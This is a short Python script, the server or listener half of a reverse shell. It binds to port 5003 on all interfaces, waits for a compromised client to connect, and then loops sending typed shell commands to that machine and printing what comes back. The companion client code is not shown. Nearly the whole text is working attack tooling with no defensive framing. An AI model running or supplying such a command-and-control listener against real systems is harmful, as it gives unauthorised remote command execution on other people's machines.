import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create socket object
s = socket.socket()

# bind the socket to all ip addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

# listen for connections
s.listen(5)
print(f"listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] current working directory:", cwd)

# loop to send shell commands and retrieve the results & print them
while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # if there is a command being inputted, continue
        continue
    # send the command to the client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # if the command is exit, break the loop
        break
    # retrieve command results
    output = client_socket.recv(BUFFER_SIZE).decode()
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
